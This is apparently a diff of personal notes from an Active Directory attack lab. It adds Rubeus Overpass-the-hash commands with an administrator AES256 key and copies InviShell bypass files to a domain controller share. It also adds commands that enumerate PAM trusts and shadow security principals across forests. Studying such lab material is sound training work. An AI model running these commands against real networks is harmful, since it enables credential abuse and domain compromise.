@@ -26,11 +26,19 @@ Sweet! The administrator of techcorp.local is a member of the built-in administr
 That makes things simple! Let's access bastion-dc as administrator. Run the below command from an elevated shell on the student VM to use Overpass-the-hash:
 
 ```
+echo %Pwn% asktgt
+```
+
+```
+C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args %Pwn% /domain:techcorp.local /user:administrator /aes256:58db3c598315bf030d4f1f07021d364ba9350444e3f391e167938dd998836883 /dc:techcorp-dc.techcorp.local /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+```
+
+```
 echo F | xcopy C:\AD\Tools\InviShell\InShellProf.dll \\bastion-dc.bastion.local\C$\Users\Public\InShellProf.dll /Y
 ```
 
 ```
-echo F | xcopy C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat \\bastiondc.bastion.local\C$\Users\Public\RunWithRegistryNonAdmin.bat /Y
+echo F | xcopy C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat \\bastion-dc.bastion.local\C$\Users\Public\RunWithRegistryNonAdmin.bat /Y
 ```
 
 ```
@@ -47,6 +55,7 @@ Check if PAM trust is enabled. First enumerate trusts on bastion.local. Because 
 ```
 Get-ADTrust -Filter {(ForestTransitive - eq $True) -and (SIDFilteringQuarantined -eq $False)}
 ```
+
 ![[Pasted image 20250325210239.png]]
 
 Once we know that there is a ForestTransitive trust and SIDFIlteringForestAware is false, enumerate trusts on production.local to be sure of PAM trust in use. If we try to access production.local from the session on bastion.local we will face the double hop issue, so we need to use Overpass-the-hash Administrator of bastion.local. First, we will use the privileges of domain administrator of techcorp.local to extract credentials of domain administrator for bastion.local. Use the below command in the command prompt that we used above:
@@ -84,4 +93,22 @@ Get-ADTrust -Filter {(ForestTransitive -eq $True) -and (SIDFilteringQuarantined 
 
 So we now know that SID History is allowed for access from bastion.local to production.local. Check the membership of Shadow Security Principals on bastion.local:
 
+
+```
+$SearchBase = "CN=Shadow Principal Configuration,CN=Services," + (Get-ADRootDSE).configurationNamingContext
+```
+
+```
+Get-ADObject -SearchBase $SearchBase -Filter * -Properties * | Select Name, Member, msDS-ShadowPrincipalSid | Format-List
+```
+
+![[Pasted image 20250325215723.png]]
+
+```
+Get-DnsServerZone -ZoneName production.local |fl *
+```
+
+![[Pasted image 20250325215745.png]]
+
+To use PowerShell Remoting to connect to an IP address, we must modify the WSMan Trustedhosts property on the student VM. Run the below command in an elevated PowerShell on the student VM:
 
